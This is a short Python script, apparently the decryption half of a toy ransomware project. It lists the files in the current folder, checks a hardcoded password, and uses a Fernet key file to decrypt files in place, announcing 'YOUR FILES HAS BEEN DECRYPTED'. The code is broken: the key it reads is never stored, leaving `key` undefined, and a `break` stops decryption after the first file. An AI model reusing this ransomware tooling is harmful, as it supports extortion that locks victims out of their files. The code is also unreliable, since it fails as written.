import os
import sys
from cryptography.fernet import Fernet
import time

files = []
for file in os.listdir():
    if file == '.idea':
        continue
    files.append(file)
print(files)

password = input('Enter the password to decrypt your files:')
with open('key.key', 'rb') as k:
    k.read()
fernet = Fernet(key)
user = 'mt'
if password == user:
    for file in files:
        with open(file, 'rb') as f:
            g = f.read()
        g_dec = fernet.decrypt(g)
        with open(file, 'wb') as w:
            w.write(g_dec)
        break
    print('CONGRATULATIONS! YOUR FILES HAS BEEN DECRYPTED')